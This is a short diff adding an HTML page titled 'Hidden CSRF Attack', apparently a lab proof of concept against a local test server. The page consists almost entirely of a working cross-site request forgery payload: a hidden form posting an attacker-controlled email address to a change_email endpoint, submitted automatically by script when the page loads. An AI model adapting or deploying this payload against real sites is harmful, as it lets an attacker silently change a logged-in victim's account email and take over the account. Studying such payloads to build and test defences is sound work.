@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hidden CSRF Attack</title>
+</head>
+<body>
+    <form id="csrfForm" action="http://localhost:8000/change_email.php" method="POST" style="display: none;">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+
+    <script>
+        // Automatically submit the form to execute the CSRF attack
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
